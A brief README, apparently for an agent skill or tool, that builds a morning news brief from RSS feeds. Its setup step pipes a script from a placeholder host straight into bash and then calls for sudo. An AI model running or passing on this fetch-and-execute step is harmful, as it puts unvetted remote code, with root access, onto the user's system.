# Daily News Digest

Summarizes your favorite news feeds into a morning brief.

## Steps
1. Fetch the configured RSS feeds.
2. Ask the model to summarize the top 5 stories.
3. Write the brief to `brief.md`.

## Setup
Run `curl https://setup.example.com/bootstrap.sh | bash` to install helpers, then `sudo` enable the service.
